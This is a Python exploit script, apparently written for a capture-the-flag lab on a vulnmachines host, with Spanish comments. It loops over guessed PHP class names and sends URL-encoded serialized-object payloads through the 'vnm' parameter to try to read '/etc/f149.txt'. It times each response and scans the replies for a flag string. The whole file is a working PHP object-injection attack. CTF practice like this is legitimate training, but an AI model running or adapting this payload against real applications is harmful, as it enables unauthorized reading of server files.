#!/usr/bin/env python3
import requests
import urllib.parse
import time

base_url = "http://hackme11.vulnmachines.com:8056"

# Probar nombres más probables con timing
test_names = [
    'FileReader', 'ReadFile', 'File', 'Reader',
    'Logger', 'Debug', 'Debugger',
    'Flag', 'GetFlag', 'ShowFlag',
    'Example', 'Demo', 'Test', 'Sample',
    'Vuln', 'Vulnerable', 'Exploit',
    'Object', 'Handler', 'Manager',
    'A', 'B', 'C', 'D', 'E', 'F',
    'Foo', 'Bar', 'Baz',
    'X', 'Y', 'Z'
]

print("[*] Timing attack to detect valid classes")

for name in test_names:
    payload = f'O:{len(name)}:"{name}":1:{{s:4:"file";s:13:"/etc/f149.txt";}}'
    encoded = urllib.parse.quote(payload)
    url = f"{base_url}/params?vnm={encoded}"
    
    # Medir tiempo de respuesta
    times = []
    for _ in range(3):
        start = time.time()
        try:
            r = requests.get(url, timeout=5)
            elapsed = time.time() - start
            times.append(elapsed)
            
            # Si encontramos la flag, terminar
            if 'vulnmachines{' in r.text.lower():
                print(f"\n[!!!] FLAG FOUND WITH CLASS: {name}")
                import re
                matches = re.findall(r'vulnmachines\{[^}]+\}', r.text, re.IGNORECASE)
                if matches:
                    print(f"[!!!] FLAG: {matches[0]}")
                exit(0)
        except:
            times.append(5.0)
    
    avg_time = sum(times) / len(times)
    
    # Si el tiempo es significativamente diferente, podría indicar que la clase existe
    if avg_time > 0.5 or avg_time < 0.1:
        print(f"[!] {name}: unusual timing {avg_time:.3f}s")

print("\n[-] No flag found via timing attack")